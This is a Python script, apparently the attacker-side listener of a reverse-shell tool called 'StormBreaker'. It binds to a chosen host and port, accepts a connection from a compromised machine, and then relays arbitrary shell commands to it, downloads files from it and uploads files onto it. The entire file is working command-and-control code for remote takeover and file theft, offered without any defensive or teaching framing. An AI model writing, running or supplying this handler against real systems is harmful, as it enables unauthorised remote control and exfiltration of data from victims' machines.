import socket
import os


def upload_file(conn, file_name):
    with open(file_name, 'rb') as f:
        line = f.read(5000)
        while line:
            conn.send(line)
            line = f.read(5000)
        print("[+] Upload Finished!")


def download_file(conn, file_name):
    with open(file_name, 'wb') as f:
        while True:
            data = conn.recv(5000)
            if not data:
                break
            f.write(data)
    print("[+] Download Finished!")


def listener():
    lhost = input("\n      [*] Enter LHOST: ")
    lport = int(input("      [*] Enter LPORT: "))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((lhost, lport))
    except:
        print("\n      [-] Invalid IP Adress!\n")
    else:
        print("      [*] Listening for Conections...")
        s.listen()
        conn, addr = s.accept()
        print(f"\n      [+] Connected to {addr[0]}\n")

        while True:
            command = input(f"<<StormBreaker@{addr[0]}>> ")
            if command != "":
                if command == 'clear':
                    os.system('clear')
                elif command[:8] == 'download':
                    conn.send("download".encode())
                    print("[*] Downloading File...")
                    download_file(conn, command[9:])
                elif command[:6] == 'upload':
                    conn.send("upload".encode())
                    upload_file(conn, command[7:])
                elif command != "quit":
                    conn.send(command.encode())
                    recieved_data = conn.recv(5000).decode()
                    print(recieved_data)
                else:
                    conn.close()
                    print("\n[-] Connection Closed!\n")
                    break
            else:
                pass
